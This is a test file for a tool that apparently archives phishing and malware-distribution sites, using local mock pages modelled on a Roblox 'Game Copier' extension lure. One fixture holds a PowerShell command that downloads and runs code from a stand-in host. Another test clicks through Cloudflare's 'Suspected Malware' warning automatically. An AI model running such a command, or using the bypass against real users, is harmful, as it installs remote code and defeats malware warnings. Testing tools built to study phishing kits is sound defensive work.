import { describe, expect, test } from "bun:test";
import { homedir } from "node:os";
import puppeteer from "rebrowser-puppeteer-core";

import { archiveWebsite } from "./website_archive";
import { downloadFileName, WebsiteDownloadFailedError } from "./website_download";
import { extractWebsiteContinuationControls, extractWebsiteDownloadLinks } from "./website_fields";
import type { WebsiteDownloadTarget } from "./website_types";

const chromiumExecutable = process.env.PHISHING_TEST_CHROMIUM
	?? `${homedir()}/Library/Caches/ms-playwright/chromium_headless_shell-1248/chrome-headless-shell-mac-arm64/chrome-headless-shell`;
const chromiumAvailable = await Bun.file(chromiumExecutable).exists();
const launch = async () => puppeteer.launch({ executablePath: chromiumExecutable, headless: true, args: ["--no-first-run"] });
const fast = { scriptNavigationSettleMs: 20, renderSettleMs: 1_000, downloadWaitMs: 3_000, humanCheckMs: 3_000 } as const;

const ZIP = Buffer.concat([Buffer.from([0x50, 0x4b, 0x03, 0x04]), Buffer.from("the kit's extension")]);
const html = (body: string, init: ResponseInit = {}, title = "RBXCore — Game Copier") => new Response(`<!DOCTYPE html><html><head><title>${title}</title></head><body>${body}</body></html>`, { ...init, headers: { "content-type": "text/html; charset=utf-8", ...init.headers } });

/**
 * rbxcore.pro's Game Copier page: every "Download" button opens a dialog,
 * and only the dialog's "Download Game-Copier.zip" starts the download, by
 * clicking an anchor its script creates. The file needs the visit's cookie.
 */
const GAME_COPIER = `<style>
.dl-modal{position:fixed;inset:0;display:grid;place-items:center;opacity:0;pointer-events:none}
.dl-modal.is-open{opacity:1;pointer-events:auto}
.dl-modal-card *{pointer-events:inherit}
.game-card{position:fixed;inset:0;z-index:0}
.dl-modal{z-index:1}
</style>
<div class="game-card">Adopt Me! · Export .rbxl</div>
<nav style="position:relative;z-index:2"><button class="btn-pill" data-dl-trigger>Download</button></nav>
<h1>Game to Studio. One export.</h1>
<div id="dlModal" class="dl-modal"><div class="dl-modal-card"><p>Install in Chrome: download the ZIP, go to chrome://extensions, enable Developer mode, and load unpacked.</p>
<button id="dlConfirm">Download Game-Copier.zip</button></div></div>
<script>
document.cookie = "visit=1; path=/";
document.querySelector("[data-dl-trigger]").addEventListener("click", () => { document.getElementById("dlModal").classList.add("is-open"); });
document.getElementById("dlConfirm").addEventListener("click", () => {
	const a = document.createElement("a"); a.href = "/Game-Copier.zip"; a.download = "Game-Copier.zip"; document.body.appendChild(a); a.click(); a.remove();
});
</script>`;

function serve(pages: Record<string, (request: Request) => Response | Promise<Response>>) {
	const hits: string[] = [];
	const server = Bun.serve({
		port: 0,
		fetch: (request) => {
			const { pathname } = new URL(request.url);
			hits.push(pathname);
			return (pages[pathname] ?? (() => new Response("not found", { status: 404 })))(request);
		},
	});
	return { server, hits, origin: `http://127.0.0.1:${server.port}` };
}

const gameCopierSite = () => serve({
	"/game-copier/": () => html(GAME_COPIER),
	"/Game-Copier.zip": (request) => (request.headers.get("cookie")?.includes("visit=1")
		? new Response(ZIP, { headers: { "content-type": "application/zip" } })
		: new Response("forbidden", { status: 403 })),
});

/** Captures the page as the flow does, keeping the visit open, and takes its download step. */
async function downloadFrom(url: string, target: (html: string) => WebsiteDownloadTarget) {
	const archive = await archiveWebsite({ url, keepSession: true }, { ...fast, getBrowser: launch });
	try {
		return { archive, file: await archive.session!.download(target(archive.html.toString("utf-8"))) };
	} finally {
		await archive.session!.close();
	}
}

const control = (label: string) => (page: string): WebsiteDownloadTarget => ({ kind: "click", control: extractWebsiteContinuationControls(page).find((candidate) => candidate.label === label)! });

describe.skipIf(!chromiumAvailable)("taking a page's download step, in a real browser", () => {
	test("the dialog's own download button, still hidden, delivers the file with the visit's cookie", async () => {
		const { server, hits, origin } = gameCopierSite();
		try {
			const { file } = await downloadFrom(`${origin}/game-copier/`, control("Download Game-Copier.zip"));
			expect(file).toEqual({ url: `${origin}/Game-Copier.zip`, fileName: "Game-Copier.zip", contentType: "application/zip", bytes: ZIP });
			expect(hits.filter((path) => path === "/Game-Copier.zip")).toHaveLength(1);
		} finally {
			server.stop(true);
		}
	}, 60_000);

	test("a button that only opens the dialog is followed by the download control the dialog shows", async () => {
		const { server, origin } = gameCopierSite();
		try {
			const { file } = await downloadFrom(`${origin}/game-copier/`, control("Download"));
			expect(file.bytes).toEqual(ZIP);
		} finally {
			server.stop(true);
		}
	}, 60_000);

	test("a download link on another host, a server-named attachment, and a file the page's script builds", async () => {
		const files = serve({ "/dl": () => new Response("MZ fake", { headers: { "content-type": "application/octet-stream", "content-disposition": "attachment; filename*=UTF-8''Roblox%20Executor.exe" } }) });
		const { server, origin } = serve({
			"/": () => html(`<a href="${files.origin}/dl?id=7" download>Get the executor</a>
<button id="build">Download script</button>
<script>document.getElementById("build").addEventListener("click", () => {
	const blob = new Blob(["powershell -c iex(irm https://x.example/a)"], { type: "text/plain" });
	const a = document.createElement("a"); a.href = URL.createObjectURL(blob); a.download = "fix.ps1"; a.click();
});</script>`),
		});
		try {
			const linked = await downloadFrom(`${origin}/`, (page) => ({ kind: "link", link: extractWebsiteDownloadLinks(page, `${origin}/`)[0]! }));
			expect(linked.file).toMatchObject({ url: `${files.origin}/dl?id=7`, fileName: "Roblox Executor.exe", bytes: Buffer.from("MZ fake") });
			const built = await downloadFrom(`${origin}/`, control("Download script"));
			expect(built.file).toMatchObject({ fileName: "fix.ps1", contentType: "text/plain", bytes: Buffer.from("powershell -c iex(irm https://x.example/a)") });
			expect(built.file.url).toStartWith("blob:");
		} finally {
			server.stop(true);
			files.server.stop(true);
		}
	}, 60_000);

	test("a step that opens a page or starts nothing is no file", async () => {
		const { server, origin } = serve({
			"/": () => html(`<a href="/mirror.zip">Mirror</a><button>Download now</button><button id="go">Get it</button>
<script>document.getElementById("go").addEventListener("click", () => { location.href = "/landing"; });</script>`),
			"/mirror.zip": () => html("<h1>Choose a mirror</h1>"),
			"/landing": () => html("<h1>Almost there</h1>"),
		});
		try {
			const link = downloadFrom(`${origin}/`, (page) => ({ kind: "link", link: extractWebsiteDownloadLinks(page, `${origin}/`)[0]! }));
			await expect(link).rejects.toThrow(new WebsiteDownloadFailedError(`the link opened the page ${origin}/mirror.zip, not a file`));
			await expect(downloadFrom(`${origin}/`, control("Download now"))).rejects.toThrow('the button "Download now" started no download');
			await expect(downloadFrom(`${origin}/`, control("Get it"))).rejects.toThrow(`the button opened the page ${origin}/landing, not a file`);
		} finally {
			server.stop(true);
		}
	}, 60_000);
});

describe.skipIf(!chromiumAvailable)("a provider's warning page before the site, in a real browser", () => {
	/**
	 * Cloudflare's "Suspected Malware" interstitial as rbxcore.pro served it:
	 * HTTP 403, a form to /cdn-cgi/phish-bypass whose button unlocks once its
	 * Turnstile passes, then a redirect to the site with a bypass cookie.
	 */
	const warning = (path: string) => html(`<h1>Warning</h1><h2>Suspected Malware</h2><p>This website has been reported for potentially distributing malware.</p>
<form action="/cdn-cgi/phish-bypass" method="GET"><input type="hidden" name="atok" value="token-1"><input type="hidden" name="original_path" value="${path}">
<button type="submit" id="bypass-button" disabled>Ignore & Proceed</button>
<div class="cf-turnstile"><input type="hidden" name="cf-turnstile-response" value=""></div></form>
<script>setTimeout(() => { document.querySelector("[name=cf-turnstile-response]").value = "0.token"; document.getElementById("bypass-button").disabled = false; }, 300);</script>`, { status: 403 }, "Suspected Malware | Cloudflare");

	test("is dismissed as a visitor would, the site behind it captured, and the warning recorded", async () => {
		const { server, hits, origin } = serve({
			"/game-copier/": (request) => (request.headers.get("cookie")?.includes("cf_bypass=1")
				? html("<h1>Game to Studio. One export.</h1>")
				: warning("/game-copier/")),
			"/cdn-cgi/phish-bypass": (request) => new Response(null, { status: 302, headers: { location: new URL(request.url).searchParams.get("original_path")!, "set-cookie": "cf_bypass=1; path=/" } }),
		});
		try {
			const archive = await archiveWebsite({ url: `${origin}/game-copier/` }, { ...fast, getBrowser: launch, errorDocumentSettleMs: 5_000 });
			expect(archive.providerWarning).toEqual({ provider: "Cloudflare", warning: "Suspected Malware" });
			expect(archive.text.toString()).toContain("Game to Studio. One export.");
			expect(archive.navigationHops.at(-1)).toMatchObject({ url: `${origin}/game-copier/`, status: 200, contentCaptured: true });
			expect(hits).toContain("/cdn-cgi/phish-bypass");
		} finally {
			server.stop(true);
		}
	}, 60_000);

	test("an ordinary error page is no warning to dismiss", async () => {
		const { server, origin } = serve({ "/": () => html("<h1>Forbidden</h1><form action=/search><button>Search</button></form>", { status: 403 }) });
		try {
			await expect(archiveWebsite({ url: `${origin}/` }, { ...fast, getBrowser: launch, errorDocumentSettleMs: 500 })).rejects.toThrow("HTTP 403");
		} finally {
			server.stop(true);
		}
	}, 60_000);
});

describe("download file names", () => {
	test("the server's name wins, then the browser's suggestion, then the URL's last segment", () => {
		expect(downloadFileName("https://h.example/x", "attachment; filename*=UTF-8''Game%20Copier.zip; filename=\"fallback.zip\"")).toBe("Game Copier.zip");
		expect(downloadFileName("https://h.example/x", "attachment; filename=\"Setup.exe\"")).toBe("Setup.exe");
		expect(downloadFileName("blob:https://h.example/uuid", undefined, "fix.ps1")).toBe("fix.ps1");
		expect(downloadFileName("https://h.example/files/Game-Copier.zip?v=2", undefined)).toBe("Game-Copier.zip");
		expect(downloadFileName("https://h.example/", undefined)).toBe("download");
		expect(downloadFileName("https://h.example/x", "attachment; filename=\"../../etc/passwd\"")).toBe(".._.._etc_passwd");
	});
});
